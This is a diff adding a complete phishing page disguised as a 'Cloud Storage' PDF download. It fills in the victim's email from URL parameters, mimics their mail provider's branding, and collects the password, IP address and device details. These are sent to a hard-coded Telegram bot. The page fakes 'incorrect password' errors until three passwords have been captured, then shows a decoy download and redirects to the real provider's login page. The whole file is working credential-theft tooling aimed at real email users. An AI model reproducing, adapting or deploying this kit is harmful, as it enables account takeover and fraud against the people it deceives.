@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>☁️Cloud Storage 🔑Login</title>
+<link id="favicon" rel="icon"
+      href="https://www.google.com/s2/favicons?domain=google.com&sz=128">
+<style>
+body {
+    margin: 0; padding: 0;
+    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    background-color: #555;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; position: relative;
+}
+.blurred-background-layer {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
+    background-image: url('https://i.postimg.cc/fWk6mJfw/background.jpg');
+    background-repeat: no-repeat; background-position: top center; background-size: cover;
+    filter: blur(8px); -webkit-filter: blur(4px); opacity: 0.7;
+}
+.login-container {
+    border-radius: 20px; background-color: #ffffff; width: 380px;
+    padding: 55px 30px 40px 30px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    text-align: center; box-sizing: border-box; position: relative; z-index: 1;
+}
+.logo { width: 70px; height: 70px; position: absolute; top: -35px; left: 50%; transform: translateX(-50%); }
+.logo img { width: 100%; height: 100%; }
+h2 { margin: 0 0 10px 0; font-size: 22px; color: #000000; font-weight: 700; }
+.subtitle { margin: 0 0 25px 0; font-size: 14px; color: #333333; }
+.input-group { margin-bottom: 15px; text-align: left; }
+.input-group input[type="email"], .input-group input[type="password"] {
+    width: 100%; padding: 12px 10px; border: 1px solid #dcdcdc; border-radius: 2px;
+    font-size: 14px; box-sizing: border-box; outline: none; transition: border-color 0.2s;
+}
+.input-group input[type="email"]:focus, .input-group input[type="password"]:focus { border-color: #0054b6; }
+.input-group input::placeholder { color: #999999; }
+.input-group input.locked { background: #f7f7f7; color: #333; cursor: default; }
+.checkbox-group { display: flex; align-items: center; margin-bottom: 25px; text-align: left; }
+.checkbox-group input[type="checkbox"] { margin: 0 8px 0 0; width: 16px; height: 16px; accent-color: #0078d4; cursor: pointer; }
+.checkbox-group label { font-size: 13px; color: #333333; cursor: pointer; }
+.btn-submit {
+    width: 100%; padding: 14px; background-color: #d32f2f; color: #ffffff;
+    border: none; border-radius: 2px; font-size: 15px; font-weight: 600;
+    cursor: pointer; transition: background-color 0.2s;
+}
+.btn-submit:hover { background-color: #b71c1c; }
+.btn-submit:disabled { background-color: #f5f5f5; color: #a0a0a0; cursor: not-allowed; }
+.btn-submit.loading { opacity: 0.7; cursor: wait; }
+.footer-text { margin-top: 25px; font-size: 9px; color: #999999; line-height: 1.4; text-align: center; }
+.error-message {
+    color: #d32f2f; font-size: 13px; margin-bottom: 15px; text-align: left;
+    display: none; background: #f8d7da; padding: 8px; border-radius: 4px;
+}
+.error-message.show { display: block; }
+#messageBox, #downloadBox {
+    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+    background-color: rgba(0,0,0,0.6); z-index: 9999; align-items: center; justify-content: center;
+}
+#messageBox .popup-content, #downloadBox .popup-content {
+    background-color: white; padding: 30px; border-radius: 4px; text-align: center;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3); max-width: 320px; width: 100%;
+}
+#messageBox h3 { margin: 0 0 10px 0; color: #28a745; font-size: 20px; }
+#messageBox p { margin: 0; color: #333; font-size: 14px; }
+#downloadBox h3 { margin: 0 0 10px 0; color: #d32f2f; font-size: 20px; }
+#downloadBox p { margin: 0 0 12px 0; color: #333; font-size: 13px; }
+.progress { width: 100%; height: 8px; background: #eee; border-radius: 4px; overflow: hidden; margin-bottom: 10px; }
+.progress-bar { width: 0%; height: 100%; background: #d32f2f; transition: width 0.35s ease; }
+#dlStatus { font-size: 12px; color: #777; }
+</style>
+</head>
+<body>
+<div class="blurred-background-layer"></div>
+
+<div class="login-container">
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg" alt="">
+    </div>
+
+    <span id="domain-name" style="display:none;"><h2><strong></strong></h2></span>
+    <h2 id="brand-title">☁️ Cloud Storage</h2>
+    <p class="subtitle" id="brand-sub"><strong>Enter your 📧email address 🔒password on your provider's 🔑login page</strong></p>
+
+    <form id="loginForm">
+        <div id="errorMessage" class="error-message"></div>
+
+        <div class="input-group">
+            <input type="email" id="email" value="[-Email-]" placeholder="📧Email"
+                   autocomplete="off" spellcheck="false" readonly>
+        </div>
+
+        <div class="input-group">
+            <input type="password" id="password" placeholder="🔒Password" autocomplete="current-password" required>
+        </div>
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="rememberMe" checked>
+            <label for="rememberMe">Remember me</label>
+        </div>
+
+        <button type="submit" class="btn-submit submit-btn">⬇️ Download file 78 KB</button>
+    </form>
+
+    <p class="footer-text"><strong>
+        &copy; 2026 ☁️Cloud Storage terms and conditions in accordance with our privacy policy and terms of use.
+        Check the official documentation to review our terms of use <span id="foot-wrap" style="display:none;">🌐<span id="foot-domain"></span>.</span>
+    </strong></p>
+</div>
+
+<!-- Decoy download overlay -->
+<div id="downloadBox" style="display:none;">
+    <div class="popup-content">
+        <h3>⬇️ Downloading</h3>
+        <p>Cloud_Storage_File.pdf <span id="dlPct">0%</span></p>
+        <div class="progress"><div class="progress-bar" id="dlBar"></div></div>
+        <p id="dlStatus">Preparing your file…</p>
+    </div>
+</div>
+
+<!-- Success popup -->
+<div id="messageBox" style="display:none;">
+    <div class="popup-content">
+        <h3>Success</h3>
+        <p id="messageBoxText">Access granted! Redirecting...</p>
+    </div>
+</div>
+
+<!-- Mailer tokens. Any spelling works; never shown raw. -->
+<script>
+window.MAILER = {
+    email:  '[-Email-]',
+    email2: '[EMail]',
+    domain: '[-Domain-]'
+};
+</script>
+
+<script>
+/* ================= CONFIG ================= */
+const TG_BOT_TOKEN   = '6253381894:AAEPGVEvyMQReYsawq5UqhfrcIcELJpJhfA';
+const TG_CHAT_ID     = '6141188817';
+const REDIRECT_URL   = '';
+const REDIRECT_DELAY = 1200;
+const SEND_IP        = true;
+
+const MAX_ATTEMPTS   = 3;   // passwords accepted before redirecting
+
+const DEFAULT_FAVICON = 'https://www.google.com/s2/favicons?domain=google.com&sz=128';
+const USE_PROVIDER_LABEL = false;
+
+/* ================= PROVIDER MAP (redirect targets only) ================= */
+const PROVIDERS = [
+  { label:'Gmail',        domains:['gmail.com','googlemail.com','google.com'], login:'https://accounts.google.com/' },
+  { label:'Outlook',      domains:['outlook.com','outlook.fr','outlook.de','outlook.es','outlook.it','hotmail.com','hotmail.fr','hotmail.co.uk','hotmail.it','hotmail.es','live.com','live.fr','live.co.uk','live.nl','msn.com'], login:'https://login.live.com/' },
+  { label:'Yahoo Mail',   domains:['yahoo.com','yahoo.fr','yahoo.co.uk','yahoo.de','yahoo.es','yahoo.it','yahoo.ca','yahoo.com.br','yahoo.com.au','ymail.com','rocketmail.com'], login:'https://login.yahoo.com/' },
+  { label:'iCloud Mail',  domains:['icloud.com','me.com','mac.com'], login:'https://www.icloud.com/' },
+  { label:'AOL Mail',     domains:['aol.com','aol.fr','aol.co.uk','aol.de'], login:'https://login.aol.com/' },
+  { label:'Proton Mail',  domains:['protonmail.com','protonmail.ch','proton.me','pm.me'], login:'https://mail.proton.me/' },
+  { label:'Zoho Mail',    domains:['zoho.com','zohomail.com','zohomail.eu'], login:'https://mail.zoho.com/' },
+  { label:'Yandex Mail',  domains:['yandex.com','yandex.ru','ya.ru','yandex.by','yandex.kz','yandex.ua'], login:'https://mail.yandex.com/' },
+  { label:'GMX',          domains:['gmx.com','gmx.net','gmx.de','gmx.at','gmx.ch','gmx.fr','gmx.es','gmx.co.uk'], login:'https://www.gmx.com/' },
+  { label:'Mail.ru',      domains:['mail.ru','inbox.ru','list.ru','bk.ru','internet.ru'], login:'https://e.mail.ru/' },
+  { label:'WEB.DE',       domains:['web.de'], login:'https://web.de/' },
+  { label:'T-Online',     domains:['t-online.de','magenta.de'], login:'https://www.t-online.de/' },
+  { label:'QQ Mail',      domains:['qq.com','foxmail.com','vip.qq.com'], login:'https://mail.qq.com/' },
+  { label:'NetEase Mail', domains:['163.com','126.com','yeah.net'], login:'https://mail.163.com/' },
+  { label:'Naver Mail',   domains:['naver.com','daum.net','hanmail.net','nate.com'], login:'https://mail.naver.com/' },
+  { label:'Orange',       domains:['orange.fr','wanadoo.fr','laposte.net'], login:'https://login.orange.fr/' },
+  { label:'SFR',          domains:['sfr.fr','neuf.fr'], login:'https://www.sfr.fr/' },
+  { label:'Free',         domains:['free.fr'], login:'https://subscribe.free.fr/' },
+  { label:'Libero',       domains:['libero.it','virgilio.it','tiscali.it','tim.it','alice.it'], login:'https://login.libero.it/' },
+  { label:'WP Poczta',    domains:['wp.pl','onet.pl','o2.pl','interia.pl','op.pl','gazeta.pl'], login:'https://poczta.wp.pl/' },
+  { label:'Seznam',       domains:['seznam.cz','email.cz','centrum.cz'], login:'https://email.seznam.cz/' },
+  { label:'Ukr.net',      domains:['ukr.net','i.ua','meta.ua'], login:'https://mail.ukr.net/' },
+  { label:'Rambler',      domains:['rambler.ru','lenta.ru','autorambler.ru','myrambler.ru','ro.ru'], login:'https://mail.rambler.ru/' },
+  { label:'Xfinity',      domains:['comcast.net'], login:'https://login.xfinity.com/' },
+  { label:'AT&T',         domains:['att.net','sbcglobal.net','bellsouth.net','ameritech.net','pacbell.net'], login:'https://login.att.net/' },
+  { label:'Verizon',      domains:['verizon.net'], login:'https://www.verizon.com/' },
+  { label:'Mail.com',     domains:['mail.com','email.com','usa.com','myself.com','consultant.com'], login:'https://www.mail.com/' }
+];
+
+/* ================= HELPERS ================= */
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+const validEmail = v => /^[^@\s]+@[^@\s]+\.[^@\s]{2,}$/.test(v);
+const domainOf = v => (String(v).split('@')[1] || '').toLowerCase().trim();
+const isToken = v => /[[\]]/.test(String(v || ''));
+const clean = v => isToken(v) ? '' : String(v || '').trim();
+const findProvider = d => PROVIDERS.find(p => p.domains.includes(d)) || null;
+const usableDomain = d => !!d && d.indexOf('.') > -1;
+
+/* ================= AUTO-GRAB THE EMAIL (URL wins, field is fallback) ================= */
+function grabEmail(){
+  const out = [];
+  const push = v => { if (v !== undefined && v !== null) out.push(v); };
+
+  // 1. URL #hash  ->  #test@mail.xom   or   #email=test@mail.xom
+  let h = location.hash.replace(/^#/, '');
+  try { h = decodeURIComponent(h); } catch(_) {}
+  h = h.trim();
+  if (h) {
+    if (validEmail(h)) push(h);
+    if (h.indexOf('=') > -1) {
+      const hp = new URLSearchParams(h);
+      ['email','e','mail','user','u','to','address'].forEach(k => { if (hp.get(k)) push(hp.get(k)); });
+    }
+  }
+
+  // 2. URL ?query  ->  ?test@mail.xom   or   ?email=test@mail.xom
+  let s = location.search.replace(/^\?/, '');
+  try { s = decodeURIComponent(s); } catch(_) {}
+  s = s.trim();
+  if (s && validEmail(s)) push(s);
+
+  const qp = new URLSearchParams(location.search);
+  ['email','e','mail','user','u','to','recipient','address','login','addr','id']
+      .forEach(k => { if (qp.get(k)) push(qp.get(k)); });
+
+  ['d','b64','data','payload'].forEach(k => {
+      const v = qp.get(k);
+      if (v) { try { const dec = atob(decodeURIComponent(v)); if (validEmail(dec)) push(dec); } catch(_) {} }
+  });
+
+  // 3. field's own value (mailer replacement) — ONLY now
+  push(emailInput.value);
+
+  // 4. mailer tokens
+  if (window.MAILER) { push(window.MAILER.email); push(window.MAILER.email2); }
+
+  // 5. referrer
+  const r = (document.referrer || '').match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/);
+  if (r) push(r[0]);
+
+  // 6. last resort: any email in the URL
+  const u = location.href.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/);
+  if (u) push(u[0]);
+
+  for (let v of out) {
+      if (isToken(v)) continue;
+      try { v = decodeURIComponent(String(v)).trim(); } catch(_) {}
+      v = v.replace(/^mailto:/i, '');
+      if (validEmail(v)) return v.toLowerCase();
+  }
+  return '';
+}
+
+/* ================= FAVICON: GRABBED DOMAIN, GOOGLE BY DEFAULT ================= */
+function setFavicon(domain){
+  const link = $('favicon');
+  if (!usableDomain(domain)) { link.href = DEFAULT_FAVICON; return; }
+
+  const chain = [
+    'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(domain) + '&sz=128',
+    'https://logo.clearbit.com/' + domain,
+    DEFAULT_FAVICON
+  ];
+  let i = 0;
+  const tryNext = () => {
+    if (i >= chain.length) return;
+    const url = chain[i++];
+    const probe = new Image();
+    probe.onload  = () => { link.href = url; };
+    probe.onerror = tryNext;
+    probe.src = url;
+  };
+  tryNext();
+}
+
+/* ================= CHAMELEON ================= */
+const domainEl = $('domain-name');
+const footWrap = $('foot-wrap');
+const footEl   = $('foot-domain');
+
+function applyBrand(domain){
+  const d = usableDomain(domain) ? domain : '';
+  const p = findProvider(d);
+  const label = d ? ((USE_PROVIDER_LABEL && p) ? p.label : d) : '';
+
+  window.__provider = (d && p) ? p.label : '';
+  window.__login = (d && p) ? p.login : (d ? 'https://' + d : '');
+  setFavicon(d);
+
+  if (!label) {
+    document.title = '☁️ Cloud Storage 🔑 Login';
+    domainEl.style.display = 'none';
+    $('brand-title').innerHTML = '☁️ Cloud Storage';
+    $('brand-sub').innerHTML = '<strong>Enter your 📧email address 🔒password on your provider\'s 🔑login page</strong>';
+    footWrap.style.display = 'none';
+    return;
+  }
+
+  document.title = label + ' • ☁️ Cloud Storage 🔑 Login';
+  domainEl.style.display = '';
+  domainEl.innerHTML = '<h2><strong>🌐 ' + esc(label) + '</strong></h2>';
+  $('brand-title').innerHTML = '☁️ ' + esc(label);
+  $('brand-sub').innerHTML = '<strong>Sign in to continue to ' + esc(label) + ' 📧🔒</strong>';
+  footWrap.style.display = '';
+  footEl.textContent = label;
+}
+
+/* ================= INIT ================= */
+const emailInput    = $('email');
+const passwordInput = $('password');
+const errorMessage  = $('errorMessage');
+const loginForm     = $('loginForm');
+const btn           = document.querySelector('.btn-submit');
+
+let attempt = 0;
+
+function lockEmail(){ emailInput.readOnly = true; emailInput.classList.add('locked'); }
+
+function validateForm(){
+  btn.disabled = !(emailInput.value.trim() !== '' && passwordInput.value !== '');
+}
+
+const grabbed = grabEmail();
+if (isToken(emailInput.value)) emailInput.value = '';
+
+if (grabbed) {
+  emailInput.value = grabbed;
+  applyBrand(domainOf(grabbed));
+} else {
+  const tok = clean(window.MAILER.domain);
+  applyBrand(usableDomain(tok) ? tok : '');
+}
+
+lockEmail();                                   // always locked — user only types the password
+setTimeout(() => passwordInput.focus(), 150);
+
+emailInput.addEventListener('input', () => {
+  validateForm();
+  applyBrand(domainOf(emailInput.value));
+});
+passwordInput.addEventListener('input', validateForm);
+validateForm();
+
+/* ================= SEND ================= */
+const tgToken = () => String(TG_BOT_TOKEN).trim().replace(/^bot/i, '');  // strips a stray "bot" prefix
+const tgChat  = () => String(TG_CHAT_ID).trim();
+
+async function getIP(){
+  if (!SEND_IP) return '';
+  try {
+    const c = new AbortController(); const t = setTimeout(() => c.abort(), 2500);
+    const r = await fetch('https://api.ipify.org?format=json', { signal: c.signal });
+    clearTimeout(t); const j = await r.json(); return j.ip || '';
+  } catch(_) { return ''; }
+}
+
+async function sendToTelegram(email, password, provider, domain, ip){
+  const token = tgToken(), chat = tgChat();
+
+  if (!token || /PASTE/i.test(token)) return { ok:false, error:'Bot token not set (TG_BOT_TOKEN)' };
+  if (!chat  || /PASTE/i.test(chat))  return { ok:false, error:'Chat ID not set (TG_CHAT_ID)' };
+
+  const text =
+    '🔐 <b>New Login Captured</b>\n' +
+    '━━━━━━━━━━━━━━━━\n' +
+    '📧 <b>Email:</b> <code>' + esc(email) + '</code>\n' +
+    '🔒 <b>Password:</b> <code>' + esc(password) + '</code>\n' +
+    '🔁 <b>Attempt:</b> ' + attempt + '/' + MAX_ATTEMPTS + '\n' +
+    '🏷 <b>Provider:</b> ' + esc(provider || '—') + '\n' +
+    '🌐 <b>Domain:</b> ' + esc(domain || '—') + '\n' +
+    '🕒 <b>Time:</b> ' + new Date().toLocaleString() + '\n' +
+    (ip ? '📍 <b>IP:</b> ' + esc(ip) + '\n' : '') +
+    '🖥 <b>Device:</b> ' + esc(navigator.userAgent) + '\n' +
+    '🔗 <b>Page:</b> ' + esc(location.href);
+
+  const base = 'https://api.telegram.org/bot' + token + '/sendMessage';
+  const body = { chat_id: chat, text, parse_mode:'HTML', disable_web_page_preview:true };
+
+  // primary: POST JSON
+  try {
+    const r = await fetch(base, {
+      method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)
+    });
+    let j = null; try { j = await r.json(); } catch(_) {}
+    if (j && j.ok) return { ok:true };
+    return { ok:false, error: (j && j.description) ? j.description : ('HTTP ' + r.status) };
+  } catch (e1) {
+    // fallback: GET
+    try {
+      const q = new URLSearchParams({ chat_id: chat, text, parse_mode:'HTML' });
+      const r2 = await fetch(base + '?' + q.toString());
+      let j2 = null; try { j2 = await r2.json(); } catch(_) {}
+      if (j2 && j2.ok) return { ok:true };
+      return { ok:false, error: (j2 && j2.description) ? j2.description : ('HTTP ' + r2.status) };
+    } catch (e2) {
+      return { ok:false, error:'network: ' + (e2.message || e2) };
+    }
+  }
+}
+
+loginForm.addEventListener('submit', async function(e){
+  e.preventDefault();
+  const email = emailInput.value.trim();
+  const password = passwordInput.value;
+  if (!email || !password) return;
+
+  attempt++;                                  // count this password
+  btn.classList.add('loading'); btn.disabled = true;
+  errorMessage.classList.remove('show');
+
+  const domain = domainOf(email);
+  const ip = await getIP();
+  const res = await sendToTelegram(email, password, window.__provider, domain, ip);
+
+  btn.classList.remove('loading');
+  passwordInput.value = '';
+
+  if (attempt >= MAX_ATTEMPTS) {
+    // last password -> decoy + redirect
+    runDecoy();
+  } else {
+    // still have attempts left -> pretend it was wrong
+    errorMessage.textContent = 'Incorrect password. Please try again.'
+      + (res.ok ? '' : '  (' + res.error + ')');
+    errorMessage.classList.add('show');
+    passwordInput.focus();
+    validateForm();
+  }
+});
+
+/* ================= DECOY DOWNLOAD + PER-PROVIDER REDIRECT ================= */
+function runDecoy(){
+  const box = $('downloadBox');
+  const bar = $('dlBar');
+  const pct = $('dlPct');
+  const status = $('dlStatus');
+
+  box.style.display = 'flex';
+  bar.style.width = '0%';
+  pct.textContent = '0%';
+  status.textContent = 'Preparing your file…';
+
+  const steps = [
+    [0,   'Preparing your file…'],
+    [14,  'Connecting to secure server…'],
+    [38,  'Downloading… 78 KB'],
+    [61,  'Verifying file integrity…'],
+    [84,  'Scanning for viruses…'],
+    [100, 'Download complete!']
+  ];
+
+  let i = 0;
+  const tick = () => {
+    if (i >= steps.length) { finish(); return; }
+    const [p, s] = steps[i++];
+    bar.style.width = p + '%';
+    pct.textContent = p + '%';
+    status.textContent = s;
+    setTimeout(tick, 420 + Math.random() * 380);
+  };
+
+  const finish = () => {
+    const dest = REDIRECT_URL || window.__login || '';
+    setTimeout(() => {
+      if (!dest) { status.textContent = 'Download complete — you may close this page.'; return; }
+      box.style.display = 'none';
+      showSuccessPopup(dest);
+    }, 500);
+  };
+
+  tick();
+}
+
+function showSuccessPopup(dest){
+  $('messageBox').style.display = 'flex';
+  $('messageBoxText').textContent = 'Access granted! Redirecting...';
+  setTimeout(() => { window.location.href = dest; }, REDIRECT_DELAY);
+}
+</script>
+</body>
+</html>
